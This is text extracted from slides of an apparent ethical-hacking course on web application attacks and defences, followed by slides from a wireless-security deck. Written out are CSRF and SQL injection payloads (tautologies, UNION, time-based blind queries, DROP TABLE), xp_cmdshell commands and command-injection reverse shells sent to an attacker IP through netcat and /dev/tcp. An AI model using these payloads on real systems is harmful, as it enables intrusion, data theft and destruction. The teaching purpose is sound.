[slide47.xml] Injections Types of Injections SQL Injection (SQLi) Command Line injection Cross-Site Scripting (XSS) Cross-Site Request Forgery (CSRF) Injection Attacks Attacker sends input loaded with instructions Causes the web app to pass instructions to the interpreter in order to run 
[slide48.xml] Web Attacks CSRF / XSFR Not the same as XSS XSS injects scripts that run on the victims browser CSRF inject HTML elements into a web app Another user (via the browser) will render the injection later when used Causes the browser to interact with the web server Typically causes the browser to access a different website Important note: It is not a script but usually HTML elements Works over HTTPS as well
[slide49.xml] More on CSRF 1. User logs into MyBank.com MyBank.com authenticates the user 2. MyBank.com sets a session cookie to track the session Can be a  persisten /non-persistent cookie  3. The user’s browser stored the cookie Persistent cookies are written to the file system / Non-persistent cookies remain in memory 4. The user now completes a money transfer to another account via a web form (requires HTTP GET) This provides variables containing data which is transferred via the URL http://mybank.east.com/transfer.php?acct=[acct_num]&amount=[T_amount] 5. The attacker posts content on a third party website and inserts and HTML image, such as with a blog post < img src =http://mybank.east.com/transfer.php?acct=[09484922]&account=[5000]> (Attacker’s bank account) 6. The content is stored on the MyBlog.org site 7. The victim browses to MyBlog.com and selects the various blogs, including the attacker’s blog with the image content Note: The browser is still holding the session cookie from MyBank.com 8. The victim’s browser renders the image content with the form in Step 5 9. The victim’s browser then navigates to MyBank.com with instructions to transfer $5,000.00 to the attacker’s bank account (It has the session cookie) 10. The site verifies the cookie and then processes the transaction to the attacker’s account in the amount of $5,000.00
[slide50.xml] Another Example Doesn’t always have to use HTTP GET – You can use POST (more complex) Vulnerability take-away: Sites that auto-trust authenticated browsers What should be done? Application should verify the users action, but how? Use CAPTCHA, use a dynamic token/require the user to enter the value
[slide51.xml] More Attacks Cross-Site Scripting (XSS) Can’t call them CSS because it refers to Cascading Style Sheets Typical XSS Process Attacker inject input into a target site with a browser script (e.g. – JavaScript) Can also trick a victim to submit input to a target site The script doesn’t run on the target site, but passes the script to a website victim When a victim browses the site, the script is run in the victim browser Allows the browser to do numerous actions on the target web site Examples:  Make transactions Reconfigurations of account Forward the user to another site etc…
[slide52.xml] Effects XSS Effects XSS can be used to make the victim’s browser attack other web site Not the browser of victims can scan other systems without them knowing Can cause the browser to engage in transactions Can be anything from disabling security settings, exfiltration of data, making transactions (e.g. – transfer money, etc.), or use the victim’s credentials to interact with other systems that they have access to
[slide53.xml] Injections Structured Query Language (SQL) Most common relational database language Database stores tables that can relate to each other Tables are made of columns and rows (rows are single records) Websites create a front end for user to interact and enter data (e.g. – search Behind the scenes the user’s input is placed in a query to return a result select * from store where city=‘[user input/Chicago]’ SQL Syntax varies between product (e.g. – Oracle, MySQL, etc.) Metadata contains information on the type of database, structure, tables, columns, etc. Getting to the metadata varies between database systems
[slide54.xml] Injections Injection Background Vulnerable website takes user input and processes it User input is not filtered Commands run on the web server with the same privileges User input can extend the logic of the query by adding additional queries See the next page Testing Methodology Identify the attack (great strategy)  Attack: Error-based SQL injection (easiest) Union-based SQL injection (append your own query) Blind SQL injection (worst case)
[slide55.xml] Language SQL stands for Structured Query Language SQL language is different depending on the database MSSQL is different than Oracle SQL SQL metadata is different between database types This means the table names, columns, schema,  etc … It is  always  great to have a manual for each database for reference You can query the database for its structure  We need the metadata of the tables Cheat sheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet http://ha.ckers.org Example: MySQL select  table_schema ,  table_name  from  information_schema.tables ;
[slide56.xml] Finding Flaws SQL Injection Flaws Can be done automated or manual Automated tools -  sqlmap Quotes offer a method to terminate the SQL string Examples:  ‘’ , ”” , ` May receive error messages: “Incorrect syntax near…” Use comment delimiters to turn off trailing string Examples:  /* , -- , # Inject statements that are always true ‘ or 1=1 ,  or ‘x’=‘x ,  ‘) or (‘a’=‘a Search the database for a column from a specific table for a specific value Use wildcards such as * to denote all (e.g. – in place of a column) SELECT [column(s)] FROM [table] WHERE [row] = search value Use a semicolon (;) to end the original query and start a new one SELECT * FROM product WHERE inv=‘ x’ or 1=1; select * from users where 1=1;-- ’; Use UNION to merge responses of 2 queries into 1 result set SELECT * FROM product WHERE inv=‘ ’ UNION select * from users where 1=1; -- ’;
[slide57.xml] 3 Classes 3 Classes of SQL Injections In-band This is where we inject data and the response is on the screen in front of you Out-of-band Data is retrieved from a different means (e.g. – email) Inferential There are no error messages or they are hidden  There is no real transfer of however you are able to rebuild the information by sending specific requests and watching the behavior of the server (web/database)
[slide58.xml] T yp e s Is an integer a string?  Integer injection http://captechu.edu/page.asp?id=1 having 1=1-- No tick is needed String injection http://captechu.edu/page.asp?id=x ` having 1=1-- Error-based SQL injection Syntax Example: Grab the database username http://captechu.edu/page.asp?id=1 or 1=convert( int,USER ))-- You get a database error message because you cannot convert a USER to an integer The database will actually answer your bad question and give you the ‘[Database USER]’ At this point you can supply it with things like @@version, @@ servername , or DB_NAME UNION-based SQL Injection Syntax http://captechu.edu/page.asp?id=1 UNION SELECT ALL 1-- UNION SELECT ALL 1,2– then try ALL 1,2,3--, then ALL 1,2,3,4-- etc. You will keep getting errors and then you won’t once you find the right number of columns UNION operators require that you supply an equal number of expressions in their target lists Now we can inject Change the first part of the query to a null or negative value and see what field echoes back The web page will return the column numbers on the screen Then substitute with things such as user() and @@version, then when it is executed, the value will be on the screen
[slide59.xml] Bl i nd Blind SQL Injection Lets extract the USER Find the length http://captechu.edu/page.asp?id=1; IF(LEN(USER)=1) WAITFOR DELAY ‘00:00:10’ Response returned immediately http://captechu.edu/page.asp?id=1; IF(LEN(USER)=2) WAITFOR DELAY ‘00:00:10’ Response returned immediately http://captechu.edu/page.asp?id=1; IF(LEN(USER)=6) WAITFOR DELAY ‘00:00:10’ There is a delay, then you get the valid webpage So, the USER is 6 characters long So…what is the username? Work it on letter at a time http://captechu.edu/page.asp?id=1; IF(ASCII(lower(substring((USER),1,1)))>97 WAITFOR DELAY ‘00:00:10’ Response returned immediately http://captechu.edu/page.asp?id=1; IF(ASCII(lower(substring((USER),1,1)))>98 WAITFOR DELAY ‘00:00:10’ Response returned immediately http://captechu.edu/page.asp?id=1; IF(ASCII(lower(substring((USER),1,1)))>98 WAITFOR DELAY ‘00:00:10’ There is a delay, then you get the valid webpage You can see why blind injection is the last resort – It takes a really long time!
[slide60.xml] Little Bobby SELECT * FROM users WHERE username = ‘bobby’; SELECT * FROM users WHERE username = ‘bobby ’ OR ‘a’=‘a’; SELECT * FROM users WHERE username = ‘bobby’ ; DROP TABLE users; SQL Injection Process Flow Find the vulnerability: Does it have a flaw? Identify the type of database: MSSQL, Oracle, MySQL,  PostgresSQL , etc. Discover the structure of the database: What are the tables? Query the database: Construct queries to exfiltrated data Execute commands to the underlying OS: Some flaws allow you to run shell commands on the OS
[slide61.xml] 3Types  of  SQL Injections Error-based injections Ask the  database  a  question  that  will  cause  an  error,  then see what  information is returned Union-based Used to combine the results of 2  or more  SELECT  statements  into  a  single result You will join your query with the one that is already there Blind Ask  the  database  a  True or False  question  to  return  a  valid  page  or not. Can  use  time/wait  or  respond  with  an  answer  to  a question
[slide62.xml] SQL  Injection Methodology Test  for  SQL  injection  -  use  a  tick  (  `  )  in the   query string Identify Determine  the injection Determine  the  type  (Integer  or String) This will determine using the tick in your attack Attack Easiest  =  Error-Based injection Union  =  Data Extraction Blind  =  This  is  your  last resort .	 You’ll  see why.
[slide63.xml] Integer  or String? http://mysite/page.asp?id=1  having 1=1-- http://mysite/page.asp?id=x ’  having1= 1-- Error-based  to  extract  data  http://mysite/page.asp?id=1  or   1=convert(int,( USER ))-- -	 We  get  the  error  “ Syntax  error  converting  the   nvarchar value  ‘[ DB  USER ]  to  a  column  of data type int” Shows  a  1  so  no tick It  gives you  the user. So  also grab: Db  name  =  DB_NAME   Servername  =  @@servername   Version  = @@version
[slide64.xml] CLI Attacks Command Line Injection (CLI) Attacks Web applications can gather user inputs and execute that input via the command line  Issues: Improper input validation (r.g. – piggyback shell commands) Commands will usually run with web server privileges Limited privileges can cause damage Bad practice to run web servers with admin or UID 0 privileges How can we tell the web server is vulnerable to this? 
[slide65.xml] Another Attack Testing for Command Injection with ‘ping’ The easiest test for CLI access is to ping yourself Most OS’s include ping commands Problem on Linux/Unix systems, what happens when you ping? Linux: need to use the -c switch, if not you’ll have to ‘ killall  ping’ Windows: Only pings 4 times by default, but can be reduced using the -n switch Ping can be blocked on networks or restricted Ping is generally a safe command to use Ping commands are small in the case of a limited buffer size Example: <normal input>; ping -c 1 1.1.1.1; echo hello Note: - Sometimes errors will not returned to the screen - This is why you may want to ping your own IP
[slide66.xml] Bl i nd Blind CLI It is a blind injection if we can’t see the output This means that you’ll need to modify your commands Blind Netcat Backdoor Shell If Netcat is installed lets open a backdoor shell Make sure that we have the correct path to nc On our system, set up a listener: nc -n -v -l -p 5656 On the target site, inject the command: Test; /usr/local/bin/nc [ip addr] 5656 /bin/bash; echo hello Now you can type shell commands – whoami, ls, etc. Blind Injection without Netcat Start a netcat listener on the pentest box For the injection, use: /bin/bash -i > /dev/tcp/[IP Addr]/[Port] 0<&1 2>&1 The -i invokes interactive mode for bash We are redirecting this to make a TCP connection across the network 0<&1 duplicates standard output file descriptor (&1) and connects to standard input of bash 2>&1 provides a shell prompt and standard error message back 
[slide67.xml] C o n tinued If the web application is vulnerable to SQL injection and the database hasn’t been secured We can make the database server run commands We may not be able to get the output (error msg, etc.) Example: MSSQL – exec master..xp_cmdshell ‘your cmd’ master..xp is a built-in stored procedure which in our case we are using cmdshell We could also use a stored procedure to make the database mount a file share on our test system with Windows File and Print Sharing via SMB Use: exec master..sp_makewebtask  \\attacker_share , “SELECT statement” e.g. – SELECT * from information_schema.tables

[slide79.xml] Vulnerability scanners Nessus OpenVas Nitko Microsoft Baseline Security Analyzer Qualys SolarWinds Rentia Each of these databases, can use a different format and capture different information about vulnerabilities. Which means that one database or tool may rate a vulnerability as low whereas another tool or database may rate a vulnerability as high or medium. Which is why you want any scanning tool to be SCAP compliant. SCAP, provides a  standardized approach for communicating security-related information. This standardization is important to the automation of interactions between security components.

[slide81.xml] Vulnerability databases National Vulnerability Database (NVD) Open Source Vulnerability Database (OSVDB) Bugtraq,  OWASP, and  CERT. Each of these databases, can use a different format and capture different information about vulnerabilities. Which means that one database or tool may rate a vulnerability as low whereas another tool or database may rate a vulnerability as high or medium. Which is why you want any scanning tool to be SCAP compliant. SCAP, provides a  standardized approach for communicating security-related information. This standardization is important to the automation of interactions between security components. 
[slide82.xml] NVD and SCAP  The National Vulnerability Database (NVD) A government database where people can search for information about vulnerabilities. Security Content Automation Protocol (SCAP). A communications protocol used to represent data about security vulnerabilities. Its needed because not all security vulnerability databases represent data the same way, but if they are SCAP compliant, we all can represent security vulnerability information the same way.  Isn’t life wonderful. https://nvd.nist.gov/
[slide83.xml] SCAP Components SCAP is all about us using the same language. Common Configuration Enumeration (CCE)  A unique number assigned to a  security-related system configuration issue.  Every security-related system configuration issue has a CCE number assigned to it. Common Vulnerabilities and Exposures (CVE)  A unique number assigned to the vulnerability (by the CVE catalog), so that everyone knows we are talking about the same thing. Common Vulnerability Scoring System (CVSS) A standard for assessing the severity of computer system security vulnerabilities. The CVSS allows responders to prioritize responses and resources according to the severity of the threat.
[slide84.xml] EC-Council Top Attacks Against Web Servers Common web server attacks include DoS/DDoS attacks DNS server hijacking/poisoning Directory traversal Man in the middle Website defacement Web server misconfiguration HTTP response splitting
[slide85.xml] Directory Traversal Directory traversal (also known as path traversal or dot-dot-slash attacks) use a series of dots and slashes, or their equivalent, to move from one folder to another.  This may allow access to files and directories stored on the remote web server, including application source code or configuration and critical system files. The trick is to simply look at the URL and find parameters you can adjust and resend . Ethical Hacking - Directory Traversal Attacks  https://www.youtube.com/watch?v=jJ0ijQ5pADE 9:00 Directory Traversal Vulnerability Tested | POC - YouTube https://www.youtube.com/watch?v=8KTVZ1yQjG8 2:00
[slide86.xml] Man-in-the-Middle (MITM) A MITM attack exploits the real-time processing of transactions, conversations or transfer of other data. Tools such as Burp Proxy can be used for just such situations. 
[slide87.xml] Website Defacement Website defacement is a category of attack in which the attack alters the visual appearance of a website.  Password guessing, vulnerability exploit, and even SQL injections are common attack methods.  This is a  common technique and was used against EC-Council in 2014 when its website homepage was replaced with an image of Edward Snowden’s passport.  You can read more about this here:  https://www.scmagazine.com/ec-council-website-defaced-by-hacker/article/538697/ .
[slide88.xml] Web Server Misconfiguration Most common web server vulnerability. Areas of concern: Error messages Default passwords SSL certificates Scripts Remote admin Configuration files
[slide89.xml] HTTP headers attacks  HTTP headers are simply fields, that are part of the HTTP request and response message header.  They are designed so that both the client and server  can send and receive data about the connection, the resource being requested, and the resource being returned. Two types of HTTP header attacks: HTTP Response Splitting Web Cache Poisoning
[slide90.xml] HTTP Response Splitting HTTP response splitting occurs when: Data is sent to a web application via a HTTP response header without being validated for malicious characters. The web application must allow input that contains a carriage return (CR) and a line feed (LF). A CR can be injected with a “%0d” or “\r” and a LF can be injected with a “%0a” or “\n” characters.  These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allows them to create additional responses entirely under their control. In other words, they can inject their own code into the web application.
[slide91.xml] HTTP RESPONSE SPLITTING What is HTTP RESPONSE SPLITTING?  https://www.youtube.com/watch?v=bVaZWHrfiPw 1:56 HTTP Basics Splitting and Cache poisoning attack  https://www.youtube.com/watch?v=mOf4H1aLiiE 7:46 Http splitting attack on webgoat - YouTube https://www.youtube.com/watch?v=JJbzvfoDtdE 4:44
[slide92.xml] Unicode or invalidated input attacks A problem with directory traversal is that IDSs have signatures for this attacks.  One method of bypassing the IDS is using a variant of the directory traversal attack called Unicode attack. Unlike ASCII, Unicode uses a 16-bit data space; therefore, it can support a wide variety of alphabets, including Cyrillic, Chinese, Japanese, Arabic, and others. One method is using Unicode strings to represent ASCII charaters.  The %2e can be used to represent a dot and the %sf can represent a slashes.  These attacks are possible because of the way in which the Unicode is parsed. These overly long strings bypass the filters that are designed to only check short Unicode. By using the Unicode syntax for ../../../ , an attacker can traverse out of the current directory and run programs such as cmd.exe. Once an attacker can execute commands on the local system, he is only a few steps away from owning the box.   
[slide93.xml] Web Cache Poisoning The objective is to send a header request (that contains malicious code) that gets saved in the cache and served to other visitors to the site. This can be done by manipulating HTTP headers. They are designed to enable both the HTTP client and server to send and receive data about the connection, to be established, the resource being requested, as well as the returned resource itself. The attacker replaces the current header with his headers thereby poisoning cache memory.   The webserver’s cache memory is where HTTP headers are stored.
[slide94.xml] HTML Hidden fields attack Some times programmers are lazy.  They sometimes use hidden fields when creating web pages. The thought was that if the users didn’t see it then its secure. The process Save the source code from a web page to your desktop. Change the price of the item to what you want to pay and then open it in the browser.  Now click on add to cart and the price is what you want to pay. Stop you will get in trouble if you do this.

[slide96.xml] Framework Tools (BeEF) Focused on leveraging browser vulnerabilities to assess the security posture of a target. Browser exploitation is a method of taking advantage of vulnerabilities in the browser software to modify specific settings without the knowledge of the end user.  The BeEF exploit framework allows penetration testers to select specific modules to target each browser in a one-two-three approach.  First, a target is selected.  After selecting a target,  the user can load a specific module used for attack.  The Load Modules area shows which modules are available for use and, once a module is selected, enables the code to be sent to the targeted browser.  After the module loads, the vulnerability can be exploited.
[slide97.xml] Core Impact:  An advanced commercial penetration testing tool suite:  (https://  www.coresecurity.com/core-impact ) Core Impact is a mature point-and-click automated exploit and assessment tool. It’s a complete package that steps the user through the process, starting at scanning and continuing through the exploit and control phase.  One unique trait of the product is that it supports a feature known as pivoting, which, in basic terms, allows a compromised machine to be used to compromise another.  This tool is useful for everyone from the novice to the seasoned security professional.
[slide98.xml] Injection Flaws Injection flaws are a type of vulnerability that allows for untrusted data to be executed and interpreted as a valid command. Injection attacks are launched by constructing malicious commands or queries. 
[slide99.xml] Web Application Attacks Buffer overflows:  Buffer: A  buffer  is a temporary memory data storage area whose length is defined in the program that creates it or by the operating system.  Are categorized into two types: heap and stack.   A  heap  is a memory space that is  dynamically  allocated. Heap based buffer overflows are different from stack-based buffer overflows in that the stack-based buffer overflow depends on overflowing a  fixed -length buffer.  Whereas heap based buffer overflows are  variable -length buffers.
[slide100.xml] Cookies Cookies are messages that web servers pass to your web browser when you visit Internet sites. Your browser stores each message in a small file, called cookie.txt . When you request another page from the server.  Your browser sends the cookie back to the server. These files typically contain information about your visit to the web page, as well as any information you've volunteered, such as your name and interests. They can be used to keep track of the location, time, and date of visits to the website stores it for later use.  If the application can be accessed via HTTP and HTTPS, there is the possibility that the cookie can be accessed via clear text. Sometimes they are even used to store passwords. These passwords might or might not be obscured. The cookies that hold these values might or might not be persistent. Best practice is for the cookie to be used for only a set period of time and, once exceeded, the browser should delete the cookie.
[slide101.xml] Cookies Tools to view cookies: CookieSpy:  view cookies, examine their contents, and determine their use. Burp Suite:  Used to trap cookies and examine them for vulnerabilities.  If the attacker can gain physical access to the victim’s computer, these tools can be used to steal cookies or to view hidden passwords. You might think that passwords wouldn’t be hidden in cookies, but that is not always the case. 
[slide102.xml] URL Obfuscation Web application designers sometimes practice security by obscurity by encoding data so that it cannot be easily viewed.  Some common encoding schemes include the following: Hex HTML Base64 Unicode For example, 0xde.0xaa.0xce.0x1a in hexadecimal converted to base 10 gives 222.170.206.26. 
[slide103.xml] URL Obfuscation URL Obfuscation - Andrew Peckham - CIT 448 - YouTube https://www.youtube.com/watch?v=QZtIEb8EhWs 7:35 Link Obfuscation - YouTube https://www.youtube.com/watch?v=612V-ZBshZg 3:21
[slide104.xml] Logging traffic Logging is a detection/prevention control, but it also proves of great importance after an attack to learn what happened.  This is where tools like WinDump and TCPdump come in handy.  TCPdump enables you to capture incoming and outgoing packets into a file and then play this file back at a later time.  You can log network traffic with the  -w  command-line switch. It should be followed by the name of the file that will contain the packets: tcpdump -w file.cap If you are monitoring a web server, you can use the following syntax to see all HTTP packets : tcpdump -n dst port 80
[slide105.xml] Intercepting Web Traffic One of the best ways to understand how a web application actually works is to observe it. A sniffer is one possible choice, but a proxy is another available tool that can make the job a little easier.  Three proxies: Burp Proxy:  https ://portswigger.net/burp/proxy.html  Paros Proxy:  https ://sourceforge.net/projects/ paros / OWASP ZAP:  https ://www.owasp.org/index.php/ OWASP_Zed_Attack_Proxy_Project
[slide106.xml] Web Proxies (Burp) Web proxies allow the penetration tester to attack and debug web applications. These tools act as a man in the middle. They enable you to intercept, inspect, and modify the raw contents of the traffic. Intercept:  Enables you to watch the traffic move back and forth between the client and the server Inspect:  Enables you to enumerate how applications work and see the mechanisms they use Modify:  Enables you to modify the data in an attempt to see how the application will respond (for example, injection attacks) These tools make it possible to perform SQL injection, cookies subversion, buffer overflows, and other types of attacks. 
[slide107.xml] Build security into the applications from the start Use source code scanners to identify vulnerabilities.  They can identify buffer overflows, race conditions, privilege escalation, and tainted input. Source code scanners: Flawfinder:  Rough Auditing Tool for Security (RATS):  StackGuard:  Microsoft /GS: 
[slide108.xml] Fuzzing One technique that can be used on a finished application is  fuzzing .  Fuzzing, also known as black box testing, is a software testing technique that provides invalid, unexpected, or random data to the inputs of a computer program.  It looks to see if the program will crash, hang, or perform some other invalid activity. Whisker N-Stalker: WebInspect: Nikto: AppDetectivePRO:
[slide109.xml] Identifying SQL servers Applications        	 Database Port Oracle Net Listener 		1521 Microsoft SQL 		1434 MySQL 				3306
[slide110.xml] SQL Injection SQL injection occurs when an attacker is able to insert SQL statements into a query by means of a SQL injection vulnerability.   SQL injection allows the attacker to take advantage of unsecure code on a system and pass commands directly to a database. This enables attackers to leverage their access and perform a variety of activities. Servers vulnerable to SQL injection can be shut down, have commands executed on them, and have their databases extracted; they are susceptible to other malicious acts, too. 
[slide111.xml] Testing for SQL Injection After a database has been identified, the attacker will place a single  ‘  inside a username field to test for SQL vulnerabilities, and this  ‘  is sometimes referred to as a tick.  This error indicates that the database is an SQL database.  Error  Msg : Microsoft OLE DB Provider for SQL Server error '80040e14' Unclosed quotation mark before the character string ' and password=''. /login.asp, line 42
[slide112.xml] SQL injection techniques Simple SQL injection:  Takes advantage of unvalidated input. Union SQL injection:  Makes use of the  UNION SELECT  command to return the union of the target database with one you’ve crafted to steal data from it. Error-based SQL injection:  Objective is to purposely force t the database to respond with table names and other error messages. Blind SQL injection:  Occurs when the attacker knows the database is susceptible to injection, but the error messages and screen returns are suppressed and don’t offer error codes or feedback. Although this can become time intensive, the attacker may attempt to steal data by asking a series of true/false statements
[slide113.xml] SELECT command SELECT  is used to choose the data you’d like to perform an action on.   The statement starts with the word  SELECT  and is followed by any number of options used to define what you want to act upon and what that action will be.   Here is an example: SELECT * FROM Orders This command basically says, “I’d like the SQL server to give me all the records from the table named Orders.”  Let’s build on that by making it a little more granular: SELECT  OrderID ,  FirstName ,  LastName  FROM Orders This command retrieves everything in the  OrderID ,  FirstName , and  LastName  columns from the table named Orders
[slide114.xml] SQL Conditional Statements When you start adding other command options such as: WHERE  (setting up a conditional statement),  LIKE  (defining a condition where something is similar to a given variable), AND , and  OR  (self-explanatory), SELECT  OrderID ,  FirstName ,  LastName  FROM Orders WHERE  LastName  ='Smith'
[slide115.xml] SQL Injection Hacking Tools SQLDict :  Performs a dictionary attack against the SQL server. SQLExec :  Executes commands on a compromised SQL server. SQLbf :  Another password-cracking program that performs both dictionary and brute-force attacks. BSQL Hacker:  An automated SQL injection tool.  SQL2.exe:  This UDP buffer-overflow attack returns a command prompt to the attacker. Marathon Tool:  Used for time-based blind SQL injection testing. SQL Power Injector:  A SQL injection exploit. Havij :  Used to perform back-end database fingerprinting, retrieve DBMS login names and passwords, dump tables, fetch data, execute SQL statements, and access underlying file systems of SQL servers. Absinthe:  Yet another SQL injection exploit.
[slide116.xml] LDAP Injection  An attack used to exploit web based applications that construct LDAP statements based on user input.  When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy.  This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. 
[slide117.xml] Hardening Web Servers Requires defense-in-depth techniques. Valid input and output Harden before you deploy. Use encryption Exercise good patch management. Disable unneeded services. Lock down the file system. Log and audit. Perform ongoing scanning for vulnerabilities.
[slide118.xml] Unvalidated Input There is no such thing as trusted input:  All input is bad and therefore must be tested .  Sometimes input controls are placed solely in the web browser.  If that situation is true, attackers just have to use tools such as OWASP Zed Application Proxy (ZAP) or Burp Proxy to inject their own input. For example, you might go to a website that has an order entry form, configure Burp Proxy, and then pass the completed entry form to Burp Proxy.  You can then alter the shopping cart total and click Continue.  If the back-end application does not check the values being passed, you might be able to successfully alter them.  In the hands of an attacker, the result can be data alteration, theft, or even system malfunctions
[slide119.xml] Use encryption Use HTTPS whenever possible. Use the right version of encryption:  Don’t use SSL version 3, because it may facilitate the Padding Oracle on Downgraded Legacy (POODLE) man-in-the-middle attack .  Everyone should be using TLS now.
[slide120.xml] Server Hardening (Patching tools) Examples include the following: Windows Server Update Services:  Enables the deployment of the latest Microsoft product updates to Windows 7, Windows 8, Windows 10, Server 2008, and Server 2012 operating systems. GFI  LanGuard :  This tool helps you remotely manage hotfixes and patches
[slide121.xml] Disable unwanted services The following tools help disable unwanted services: Microsoft Baseline Security Analyzer:  A tool that will scan Microsoft systems for common security misconfigurations.  IIS Lockdown:  Another great tool from Microsoft that scans older IIS servers and turns off unnecessary features. It will suggest the types of security controls that are built in to IIS versions 7 and 8. SoapUI:  Used for web services testing of protocols such as HTTP, SOAP, JSM, REST, WADL, WSDL, and others. Retina CS:  A commercial vulnerability and patch management tool from BeyondTrust
[slide122.xml] Lock down file system Lock down the file system. Use encryption and enable file-level security. This will allow full access control at the folder and/or file levels.  File-level security is the last level of access control before a request is fulfilled by the operating system.
[slide123.xml] Log and audit. Perform logging to keep track of activity on your web server. Auditing allows you to understand and detect any unusual activity.  Although auditing is not a preventive measure, it does provide valuable information about the access activity on your IIS server.  Logging can provide you with details such as when, where, and how the access occurred and whether the request was successfully processed or rejected by the server.
[slide124.xml] Perform ongoing scanning for vulnerabilities Automated tools allow the ethical hacker to cover a lot of ground quickly and use the results for further manual inspection.  These solutions also have different usability and interfaces, which range from command-line interface (CLI) to graphical user interface (GUI) products. These products can also be divided into further categories, as some are free and others are for purchase or are run through a subscription service. 
[slide125.xml] Application Program Interface (API)s In 2018, APIs were responsible for 83% of web traffic worldwide. Most complex applications are based on microservices and microservices are basically web applications communicating with one another using APIs.  Web services and APIs are prone to the same vulnerabilities as web applications.  Two popular APIs: Service-oriented architecture (SOA)  Simple Object Access Protocol (SOAP)
[slide126.xml] Service-oriented architecture (SOA)  Is a software development model for distributed application components that incorporates discovery, access control, data mapping and security features. It allows services to be provided to the other components of an  application, through a communication protocol over a network.  The basic principles of service-oriented architecture are independent of vendors, products and technologies. A service is a discrete unit of functionality that can be accessed remotely and acted upon and updated independently, such as retrieving a credit card statement online.  Think of it as an Application Programming Interface (API)
[slide127.xml] Simple Object Access Protocol (SOAP) SOAP ( Simple Object Access Protocol) is a message protocol that allows distributed elements of an application to communicate.  SOAP can be carried over a variety of lower-level protocols, including the web-related Hypertext Transfer Protocol (HTTP). Think of it as an API.
[slide128.xml] The End

[slide5.xml] Background 802.11 is a standard released by IEE Institute of Electrical and Electronics standards 802 refers o the categorization of standards for LANs .11 refers specifically to wireless LANs Changes to .11 resulted in a/b/g/etc. Frequencies and Channels Change from country to country based on regulation Parts of the radio spectrum allocated for general use are called  industrial ,  scientific , and  medical (ISM)  radio bands Bands are very crowded (microwaves, garage doors, etc.) 802.11 operates in 2.4 GHz or 5 GHz ISM bands Example: 802.11a operates in the 5GHz band where b & g in the 2.4 GHz Example: 802.11n is a “dual band” because it supports both 5 GHz channels are numbered non-consecutively from 36 – 165 (in the US) 2.4 GHz Channels are numbered consecutively from 1-14
[slide6.xml] 802.11 Frame Types Control Frame RTS, CTS, ACK Data Frame Management Frame Beacon, Probe req/resp, Assoc. req/resp,  Reassoc  req/resp, Disassociation, Authentication,  Deauthentication Connecting to an AP Scanning Active scanning Passive scanning Authentication Open Shared Key 802.1X Association Restricted to infrastructure mode Similar to plugging into wired network
[slide7.xml] Shake Hands Four-way Handshake AP sends a nonce-value to client STA sends its own non-ce value to AP with MAC Incl. authentication (Message Authentication and Integrity Code or MAIC) AP sends the GTK and a sequence number with another MAC STA sends a confirmation to the AP
[slide8.xml] MAC Wireless Vendor Mac Address A unique identifier assigned to network interfces 802.11 uses MAC-48 Others that use MAC-48 (Ethernet, Bluetooth, 802.5 (Token Ring), FDDI, ATM) Vendors use Organizationally Unique Identifier (OUI) Best site: IEEE Standards Association  http://standards.ieee.org/develop/regauth/oui36/public.htm May have to look deeper than just the OUI
[slide9.xml] There  is  a Difference Service Set Identifiers (SSID’s) A few different types: SSID – Service Set Identifier General term used to name a WLAN BSSID – Basic SSID MAC address of the wireless device ESSID extended SSID Name for access points providing the same service to the WLAN Some may share the ESSID while others are different 
[slide10.xml] Wireless Vulnerabilities Categories DoS Blocks legitimate traffic Rogue APs Unauthorized (probably insecure) APs setup by employee’s. Many  times by‐pass legitimate AP. Evil Twin Aps SSID is created to appear as an authorized enterprise AP. Creates a  MITM attack (a.k.a client‐duping) Traffic Capture (intercepting) Attacker gains access to the data link layer (layer_?_). Must be within  proximity of device (depends of HW used). Cryptographic Attacks Certain encryption protocols are inherently weak such as WEP.  Attackers exploit flaws in the crypto initialization vector exchange or  cracking weak encryption keys
[slide11.xml] DoS Attacks Is  conducting  a  DoS Attack  worth  it? Causing  DoS Attacks Can simply unplug the device to see the impact Use  radio‐frequency  (RF)  jamming technology Typically  overwhelms  the  wireless  signals  with noise Best  Method:  use a de‐authentication  attack Hop across multiple channels to knock off clients/Aps In addition: send a flood authentication request and   association  messages  causing  inability  to interact  w/   legitimate clients. –  Example  Tool: VOID11

[slide14.xml] It's  all  about  the Method Two Methods of Wireless Discovery Active Directory Early days of identifying wireless was using “active discovery” NetStumbler would send out broadcast probe requests and log responses Today, most Aps are configured to ignore these requests Passive Discovery This is the standard method of discovery Simply listens on each channel and collects the data it sees Then analyzes the data to build relationships between frames Allows us to form a picture of the wireless network range Even though an AP doesn’t announce its SSID in beacons or respond to broadcast probe requests A passive discovery tool will list the BSSID When a client joins a network, it must announce the SSID Passive Discovery is undectable 
[slide15.xml] Sniffing Tools SSIDSNIFF Reconnaissance of wireless access points ID’s wireless networks Card must support 802.11 frames Uses 802.11 packet header from network frames via access points and network hosts to be viewed Command ssidsniff [-VdDgH] [-i interface] [-s snaplen] [-f filter] [-c maxcount] -w file [-v level]

[slide17.xml] Another Tool Wireless  NetView Small utility that runs in the background Monitors the activity of wireless networks around you For each detected network, it displays the following information: SSID, Last Signal Quality, Average Signal Quality, Detection Counter, Authentication Algorithm, Cipher Algorithm, MAC Address, RSSI, Channel Frequency, Channel Number, and more. Requirements: Windows 7, Vista, Server 2008, or XP with SP2/SP3
[slide18.xml] Integration with  Other Tools Nessus Access Point Detection Plugin #11026 Originally written by John Lampe Uses 4 techniques to identify APs Follows a sequence If one of the four succeeds, the remaining tests are not conducted 1 st  relies on OS fingerprinting for Aps Checks banners received via port 80 Also checks FTP banners via port 21 Checks UDP port 161 (SNMP) Determines if they have Management Information Base (MIB) that is consistent with Aps Uses default community string “public” for authentication AP could use other ports, so scan them Management interface, etc.
